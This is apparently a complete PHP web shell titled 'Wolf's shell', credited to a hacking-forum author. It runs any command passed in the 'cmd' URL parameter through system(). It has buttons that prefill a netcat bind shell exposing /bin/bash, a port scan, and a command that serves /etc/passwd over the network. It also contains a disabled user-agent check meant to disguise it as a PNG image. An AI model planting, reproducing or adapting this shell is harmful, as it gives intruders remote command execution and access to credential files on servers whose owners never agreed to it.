<?PHP
/*
Name: Simple php shell
Date: 01/08/2010
Author: wolfmankurd
URL: http://www.hellboundhackers.org/code/simple-php-shell-1592_php.html
Note:
        This script is dangerous. If you find this on your server without knowledge of how it got there delete it immediately
and have a security professional look into the matter.
        It has nothing to do with me, this script and others like it are simple to make and freely available.
        For an "enemies perspective" education in the matter try http://www.hellboundhackers.org
*/
$useragent="secret";
//Only matching User Agents can use this shell.
//Every one else gets this base64 encoded png image.
$img="iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAIAAAAlC+aJAAAAAXNSR0IArs4c6QAAAAlwSFlzAAAL
EwAACxMBAJqcGAAAAAd0SU1FB9oIAgEPAo1cAXcAAAAZdEVYdENvbW1lbnQAQ3JlYXRlZCB3aXRo
IEdJTVBXgQ4XAAAAIklEQVRo3u3BAQ0AAADCoPdPbQ8HFAAAAAAAAAAAAAAA8G4wQAABEp2S+AAA
AABJRU5ErkJggg==";
if(1==1){
$cmd=$_GET['cmd'];
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
<link rel="shortcut icon" href="?img#"/>
<title>Wolf's shell</title>
<script type="text/javascript">
//Shortcut functions
function nc_shell(){
        document.getElementById('cmd').value='nc -lnvp 4444 -e /bin/bash 2>/dev/stdout';
}
function nc_portscan(){
        document.getElementById('cmd').value='nc -vnzw 1 127.0.0.1 1-10000 2>/dev/stdout|cut -f3-4 -d" "';
}
function nc_serve(){
        document.getElementById('cmd').value='cat /etc/passwd|nc -lp 8080 2>/dev/stdout';
}
</script>
</head>
<body>
<form action="#" method="get">
<input type="text" id="cmd" name="cmd" size="80"/>
<input type="submit" value="Execute"/>
</form>
<p>
<table border="1" cellpadding="10"><tr><td colspan="2" align="center">
Shortcuts
</td></tr>
<tr><td>netcat</td><td>
<input type="button" onClick="nc_shell()" value="shell"/>
<input type="button" onClick="nc_portscan()" value="portscan"/>
<input type="button" onClick="nc_serve()" value="serve"/>
</td></tr></table>
<br/>
<?
if(isset($cmd)){
if($cmd=="") $cmd="id";
?>
<table border="1" cellpadding="10"><tr><td align="center">
<?PHP
        echo "$cmd</td></tr><tr><td><pre>";
        system($cmd,$ret);
        if($ret!=0) echo"Command failed!";
        echo "</pre></td></tr></table>";
}
?>
</p>
</body>
</html>
<?PHP
}else{
        header("Content-Type: image/png ");
        echo base64_decode($img);
}
?>